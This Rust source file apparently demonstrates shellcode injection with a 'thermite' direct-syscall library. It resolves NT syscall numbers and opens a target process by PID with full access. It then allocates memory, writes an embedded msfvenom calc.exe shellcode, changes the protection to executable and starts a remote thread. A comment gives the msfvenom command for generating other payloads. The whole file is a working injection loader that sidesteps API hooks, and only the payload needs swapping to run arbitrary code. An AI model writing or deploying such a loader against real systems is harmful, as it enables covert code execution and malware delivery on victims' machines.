use std::{mem, process};
use std::ffi::c_void;
use std::ptr::null;
use thermite::models::windows::peb_teb::UNICODE_STRING;
use thermite::models::windows::nt_status::NtStatus;
use thermite::models::Export;

// Don't forget #[repr(C)] !

#[repr(C)]
#[derive(Clone, Debug)]
pub struct ObjectAttributes {
    length: u32,
    root_directory: isize,//Handle,
    object_name: *const UNICODE_STRING,
    attributes: u32,
    security_descriptor: *const c_void,//CVoid,
    security_quality_of_service: *const c_void,
}

#[repr(C)]
#[derive(Debug)]
pub struct ClientId {
    pub unique_process: isize,
    pub unique_thread: isize,
}


// Some useful constants
// lifted straight from windows libs
const SYNCHRONIZE: u32 = 0x00100000u32;
const STANDARD_RIGHTS_REQUIRED: u32 = 0x00100000u32;
const PROCESS_ALL_ACCESS: u32 = STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFFF;
const MEM_RESERVE: u32 = 0x2000;
const MEM_COMMIT: u32 = 0x1000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const GENERIC_EXECUTE: u32 = 0x20000000;

/// A basic msfvenom shellcode, just spawns calc.exe 
///
/// __Stranger Danger__
/// 
/// Don't put everything you find in your computer, a shellcode is dangerous
/// 
/// Just go get your own shellcode, you can generate it using the following command:
/// ```bash
/// msfvenom -p windows/x64/exec CMD=calc.exe -f rust -v SHELLCODE
/// ```
///
const POP_CALC: [u8; 276] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];



////
///        UTILITY FUNCTIONS
////

// Helps us handle the values returned by the syscalls, transmutes the int32 into an actual NT_STATUS
// It's just for quality of life during debugging, the program can work just as well without
fn handle_status(str: &str, x: i32) {
    let nt_status : NtStatus = unsafe { mem::transmute(x) };
    match nt_status {
        NtStatus::StatusSuccess => {
            eprintln!("[^-^] {str}: {nt_status}");
        },
        _ => {
            eprintln!("[TwT] {str}: {nt_status}");
            process::exit(nt_status as _);
        }
    }
}

/// Function that returns true only for the syscalls we will need
/// Made to be passed to thermite::syscalls::search to filter NTDLL Exports
fn filter(x: &&Export) -> bool {
    ["NtOpenProcess", "NtAllocateVirtualMemory", "NtWriteVirtualMemory",
        "NtProtectVirtualMemory", "NtWaitForSingleObject", "NtClose", "NtCreateThreadEx"].contains(&x.name.as_str())
}

/// Read the PID from the program's command line arguments
/// If nothing is found or if the argument cannot be parsed, returns None
/// Else returns Some(pid)
fn read_pid() -> Option<u32> {
    let args: Vec<String> = std::env::args().collect::<Vec<String>>();
    if args.len() > 1 {
        let pid: u32 = args[1].parse().ok()?;
        println!("[?-?] Target process ID {pid}");
        Some(pid)
    } else { None }
}


///
/// The function below demonstrate how to execute a shellcode
/// either locally, in our own processe's memory or by
/// injecting it in a remote process.
///
/// It takes a PID as argument, if the pid is 0, the shellcode will be executed locally
/// Else it will be injected in the target process
///
fn exec(pid: u32) {
    // Looking up the syscalls we need
    let tmp_vec = thermite::syscalls::search(
        filter as fn(&&Export)->bool,
        thermite::syscalls::simple_get_ssn,
    ).unwrap(); // Not clean, but does the work
    
    let syscalls: std::collections::HashMap<&str, u16> = tmp_vec
        .iter()
        .map(|syscall| (syscall.name.as_str(), syscall.clone().ssn))
        .collect();
    println!("Syscalls found : {:#x?}", syscalls);

    // Declaring structures we're going to use later
    let mut thread_handle: isize = 0;
    let oa_process: ObjectAttributes = ObjectAttributes {
        length: mem::size_of::<ObjectAttributes>() as _,
        root_directory: 0u32 as _,
        object_name: 0u32 as _,
        attributes: 0,
        security_descriptor: 0u32 as _,
        security_quality_of_service: 0u32 as _,
    };
    // let oa_thread = oa_process.clone(); // Unused 

    // This is "pseudo Handle", a sort of handle constant
    // The value -1 means it's a handle to our own process
    let mut process_handle: isize = -1;

    // But if we have a target PID,
    // we go get a real handle to the target process
    // Else w'll  just continue with the pseudo handle
    if pid.ne(&0) {
        let client_id = ClientId {
            unique_process: pid as _,
            unique_thread: 0 as _,
        };
        unsafe {
            let x = thermite::syscalls::syscall_handler(
                syscalls["NtOpenProcess"].clone(),
                0x4,
                &mut process_handle,
                PROCESS_ALL_ACCESS,
                // PROCESS_VM_WRITE | PROCESS_VM_READ,
                &oa_process,
                &client_id,
            );
            handle_status("NtOpenProcess", x);
        }
        println!("Process Handle: {:#x?}", process_handle);
    }
    
    let mut buf_size: usize = POP_CALC.len();
    let mut base_addr: *mut c_void = 0u32 as _;

    // First we allocate some memory for our shellcode
    unsafe {
        let x = thermite::syscalls::syscall_handler(
            syscalls["NtAllocateVirtualMemory"].clone(),
            0x6,
            process_handle,                     // [in]      HANDLE    ProcessHandle,
            &mut base_addr,                     // [in, out] PVOID     *BaseAddress,
            0u32,                               // [in]      ULONG_PTR ZeroBits,
            &mut buf_size,                      // [in, out] PSIZE_T   RegionSize,
            MEM_COMMIT | MEM_RESERVE,           // [in]      ULONG     AllocationType,
            PAGE_READWRITE                      // [in]      ULONG     Protect
        );
        handle_status("NtAllocateVirtualMemory", x);
    };
    println!("[^-^] Allocated {buf_size} bytes of memory at address {base_addr:#x?}");

    // Copy the shellcode to newly allocated memory
    let mut bytes_written: usize = 0;
    unsafe {
        let x = thermite::syscalls::syscall_handler(
            syscalls["NtWriteVirtualMemory"].clone(),
            0x6,
            process_handle,            // [in]              HANDLE    ProcessHandle,
            base_addr,                 // [in]              PVOID     *BaseAddress,
            &POP_CALC,                 // [in]              PVOID     Buffer,
            buf_size,                  // [in]              ULONG     NumberOfBytesToWrite,
            &mut bytes_written         // [out, optional]   PULONG    NumberOfBytesWritten ,
        );
        handle_status("NtWriteVirtualMemory", x);
    }
    println!("[^-^] Successfully written {buf_size} bytes in remote memory");

    // Change protection status of allocated memory to READ+EXECUTE
    let mut bytes_written = POP_CALC.len();
    let mut old_protec = PAGE_READWRITE;
    unsafe {
        let x = thermite::syscalls::syscall_handler(
            syscalls["NtProtectVirtualMemory"].clone(),
            0x6,
            process_handle,             // [in]              HANDLE    ProcessHandle,
            &mut base_addr,             // [in, out]         PVOID     *BaseAddress,
            &mut bytes_written,         // [in, out]         PULONG    NumberOfBytesToProtect,
            PAGE_EXECUTE_READ,          // [in]              ULONG     NewAccessProtection,
            &mut old_protec             // [out]             PULONG    OldAccessProtection,
        );
        handle_status("NtProtectVirtualMemory", x);
    };

    // Create a remote thread in target process
    unsafe {
        let x = thermite::syscalls::syscall_handler(
            syscalls["NtCreateThreadEx"].clone(),
            0xb,
            &mut thread_handle,
            GENERIC_EXECUTE,
            null::<*mut c_void>(),//&mut oa_thread,
            process_handle,
            base_addr,
            base_addr,
            0i32,
            null::<*mut c_void>(),
            null::<*mut c_void>(),
            null::<*mut c_void>(),
            null::<*mut c_void>()
        );
        handle_status("NtCreateThreadEx", x);
    }

    // Wait for the thread to execute
    // Timeout is a null pointer, so we wait indefinitely
    unsafe {
        let x = thermite::syscalls::syscall_handler(
            syscalls["NtWaitForSingleObject"].clone(),
            0x3,
            thread_handle,                  //  [in] HANDLE         Handle,
            0,                              //  [in] BOOLEAN        Alertable,
            null::<*mut c_void>(),          //  [in] PLARGE_INTEGER Timeout

        );
        handle_status("NtWaitForSingleObject", x);
    };

    // Close the handle
    unsafe {
        let x = thermite::syscalls::syscall_handler(
            syscalls["NtClose"].clone(),
            0x1,
            thread_handle,      //  [in] HANDLE         Handle,
        );
        handle_status("NtClose", x);
    };
}


fn main() {
    exec(read_pid().unwrap_or(0));
}